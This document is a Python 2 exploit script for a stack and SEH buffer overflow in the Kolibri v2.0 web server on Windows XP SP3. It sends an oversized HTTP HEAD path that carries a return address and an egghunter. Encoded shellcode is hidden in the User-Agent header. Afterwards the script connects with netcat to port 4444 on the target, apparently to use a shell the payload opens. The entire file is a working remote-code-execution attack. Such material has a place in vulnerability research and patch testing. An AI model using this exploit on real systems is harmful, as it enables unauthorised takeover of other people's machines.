#!/usr/bin/env python

# Exploit Title: Kolibri v2.0 Buffer Overflow
# Date: 31/1/2017
# Affected Version: Kolibri-2.0
# Tested on: Windows XP SP3 ENG

import socket
import sys
from struct import pack
from time import sleep
from subprocess import call

print "\n  Kolibri v2.0 Buffer Overflow exploit"

host = ""
port = 8080

eip_offset = 515
seh_offset = 787

# CALL ESP 0x7C8369F0 in kernel32.dll
ret = pack('<L', 0x7C8369F0)

# egghunt.exe cstyle 0x434D4144
hunter = ("\x90\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x44\x41\x4d\x43\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7")
egg = "DAMCDAMC"

nops = "\x90\x90\x90\x90\x90"

shellcode = ("\x6a\x52\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x22\xae"
"\xb8\x9d\x83\xeb\xfc\xe2\xf4\xde\x46\x3a\x9d\x22\xae\xd8\x14"
"\xc7\x9f\x78\xf9\xa9\xfe\x88\x16\x70\xa2\x33\xcf\x36\x25\xca"
"\xb5\x2d\x19\xf2\xbb\x13\x51\x14\xa1\x43\xd2\xba\xb1\x02\x6f"
"\x77\x90\x23\x69\x5a\x6f\x70\xf9\x33\xcf\x32\x25\xf2\xa1\xa9"
"\xe2\xa9\xe5\xc1\xe6\xb9\x4c\x73\x25\xe1\xbd\x23\x7d\x33\xd4"
"\x3a\x4d\x82\xd4\xa9\x9a\x33\x9c\xf4\x9f\x47\x31\xe3\x61\xb5"
"\x9c\xe5\x96\x58\xe8\xd4\xad\xc5\x65\x19\xd3\x9c\xe8\xc6\xf6"
"\x33\xc5\x06\xaf\x6b\xfb\xa9\xa2\xf3\x16\x7a\xb2\xb9\x4e\xa9"
"\xaa\x33\x9c\xf2\x27\xfc\xb9\x06\xf5\xe3\xfc\x7b\xf4\xe9\x62"
"\xc2\xf1\xe7\xc7\xa9\xbc\x53\x10\x7f\xc6\x8b\xaf\x22\xae\xd0"
"\xea\x51\x9c\xe7\xc9\x4a\xe2\xcf\xbb\x25\x51\x6d\x25\xb2\xaf"
"\xb8\x9d\x0b\x6a\xec\xcd\x4a\x87\x38\xf6\x22\x51\x6d\xf7\x2a"
"\xf7\xe8\x7f\xdf\xee\xe8\xdd\x72\xc6\x52\x92\xfd\x4e\x47\x48"
"\xb5\xc6\xba\x9d\x33\xf2\x31\x7b\x48\xbe\xee\xca\x4a\x6c\x63"
"\xaa\x45\x51\x6d\xca\x4a\x19\x51\xa5\xdd\x51\x6d\xca\x4a\xda"
"\x54\xa6\xc3\x51\x6d\xca\xb5\xc6\xcd\xf3\x6f\xcf\x47\x48\x4a"
"\xcd\xd5\xf9\x22\x27\x5b\xca\x75\xf9\x89\x6b\x48\xbc\xe1\xcb"
"\xc0\x53\xde\x5a\x66\x8a\x84\x9c\x23\x23\xfc\xb9\x32\x68\xb8"
"\xd9\x76\xfe\xee\xcb\x74\xe8\xee\xd3\x74\xf8\xeb\xcb\x4a\xd7"
"\x74\xa2\xa4\x51\x6d\x14\xc2\xe0\xee\xdb\xdd\x9e\xd0\x95\xa5"
"\xb3\xd8\x62\xf7\x15\x48\x28\x80\xf8\xd0\x3b\xb7\x13\x25\x62"
"\xf7\x92\xbe\xe1\x28\x2e\x43\x7d\x57\xab\x03\xda\x31\xdc\xd7"
"\xf7\x22\xfd\x47\x48")

buf =  "A"*(515) + ret + hunter #+ "B"*(800-515-len(ret)-len(hunter))

stage2 = egg + shellcode + "A"*(1000- len(shellcode) - len(egg))

# "User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; he; rv:1.9.2.12) Gecko/20101026 Firefox/3.6.12\r\n"
req = ("HEAD /" + buf + " HTTP/1.1\r\n"
"Host: " + host + ":" + str(port) + "\r\n"
"User-Agent: " + stage2 + "\r\n"
"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
"Accept-Language: he,en-us;q=0.7,en;q=0.3\r\n"
"Accept-Encoding: gzip,deflate\r\n"
"Accept-Charset: windows-1255,utf-8;q=0.7,*;q=0.7\r\n"
"Keep-Alive: 115\r\n"
"Connection: keep-alive\r\n\r\n")

print "  [+] Connecting to %s:%d" % (host, port)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

print "  [+] Sending payload.."
s.send(req)
data = s.recv(1024)

print "  [+] Closing connection.."
s.close()

print "  [+] Done!"

try:
	print '  [+] Trying to connect to target...\n'
        try:
		sleep(2)
		call(['nc', host, '4444'])
        except:
                print '  [!] Whoops!! Something went wrong?'
except:
        print '  [!] Whoops!! Something went wrong?'
